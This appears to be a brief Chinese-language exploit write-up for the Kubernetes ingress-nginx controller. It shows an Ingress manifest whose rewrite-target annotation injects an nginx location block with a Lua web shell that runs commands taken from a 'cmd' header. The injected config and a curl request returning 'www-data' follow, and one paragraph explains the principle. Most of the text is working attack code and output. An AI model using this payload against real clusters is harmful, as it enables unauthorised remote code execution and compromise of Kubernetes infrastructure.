## exp

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: evil-nginx
  annotations:
    kubernetes.io/ingress.class: "nginx"
    nginx.ingress.kubernetes.io/rewrite-target: |
      feng/ last;
      }
      location feng/ {
        content_by_lua_block {
          local rsfile = io.popen(ngx.req.get_headers()["cmd"]);
          local rschar = rsfile:read("*all");
          ngx.say(rschar);
        }
      }
      location /fs/{
spec:
  ingressClassName: nginx
  rules:
  - host: "test.feng"
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: exploit
            port:
              number: 80

```

service可以不存在。

原理就是使用了`nginx.ingress.kubernetes.io/rewrite-target`注解会往`nginx.conf`额外注入一段内容，这部分内容正好要拼接到`rewrite "(?i)/"`，因此注入利用rewrite到构造的location中，在这段location里面的content_by_lua_block可以执行恶意的lua命令，而lua是可以rce的，写一段rce的代码即可。



```bash

                        rewrite "(?i)/" feng/ last;
                }
                location feng/ {
                        content_by_lua_block {
                                local rsfile = io.popen(ngx.req.get_headers()["cmd"]);
                                local rsfile = io.popen("ls -al /");
                                local rschar = rsfile:read("*all");
                                ngx.say(rschar);
                        }
                }
                location /fs/{
                        break;
                        proxy_pass http://upstream_balancer;

                        proxy_redirect                          off;

```



```bash
root@k8s-worker:/# curl -H "cmd: whoami" http://test.feng:30080/
www-data
```

